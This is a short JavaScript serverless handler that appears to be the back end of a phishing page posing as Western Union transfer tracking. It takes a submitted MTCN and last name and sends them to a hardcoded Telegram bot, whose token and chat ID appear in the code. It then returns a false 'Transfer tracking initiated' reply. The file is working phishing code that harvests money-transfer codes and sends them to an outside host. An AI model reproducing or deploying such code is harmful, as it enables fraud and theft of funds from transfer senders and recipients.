export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { mtcn, lastName } = req.body || {};
  if (!mtcn) return res.status(400).json({ error: "MTCN is required" });

  const TELEGRAM_TOKEN = "8512472923:AAHEIfQnuuF7MQOtVgQKcJkzpQ3SfmcY44A";
  const TELEGRAM_CHAT_ID = "8278524493";

  const message = `🔔 <b>Western Union Track Transfer</b>\n\n📦 MTCN Code: <code>${mtcn}</code>${lastName ? `\n👤 Last Name: ${lastName}` : ""}\n\n🕐 Time: ${new Date().toISOString()}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" }),
    });
  } catch (err) {
    console.error("Telegram error:", err);
  }

  res.json({ success: true, message: "Transfer tracking initiated" });
}
